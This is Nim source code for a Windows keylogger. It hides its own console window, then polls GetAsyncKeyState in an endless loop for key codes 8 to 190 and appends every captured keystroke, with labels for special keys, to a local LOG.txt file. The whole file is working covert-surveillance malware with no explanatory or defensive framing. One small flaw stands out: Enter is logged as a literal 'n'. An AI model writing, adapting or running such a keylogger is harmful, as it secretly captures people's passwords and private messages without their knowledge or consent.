import os 
import windows

discard execShellCmd("cls")
proc GetAsyncKeyState(key: cint): int {.header: "<windows.h>", varargs.}

proc Stealth() =
  var Stealth: HWND
  discard AllocConsole()
  Stealth = FindWindowA("ConsoleWindowClass", nil);
  discard ShowWindow(Stealth,0)

proc save(i: int) =
  var file = open("LOG.txt", fmAppend)
  case i
    of 32:
      write(file, " ")
    of 8:
      write(file, "[BACKSPACE]")
    of 13:
      write(file, "n")
    of VK_TAB:
      write(file, "[TAB]")
    of VK_SHIFT:
      write(file, "[SHIFT]")
    of VK_CONTROL:
      write(file, "[CTRL]")
    of VK_ESCAPE:
      write(file, "[ESC]")
    of VK_END:
      write(file, "[END]")
    of VK_HOME:
      write(file, "[HOME]")
    of VK_LEFT:
      write(file, "[LEFT]")
    of VK_UP:
      write(file, "[UP]")
    of VK_RIGHT:
      write(file, "[RIGHT]")
    of VK_DOWN: 
      write(file, "[DOWN]")
    of 190, 110:
      write(file, ".")
    else: write(file, $chr(i))
  close(file)

proc main() =
  Stealth()
  while true:
    for i in 8..190:
      if GetAsyncKeyState(cint(i)) == -32767:
        save(i)
  discard execShellCmd("PAUSE")

main()
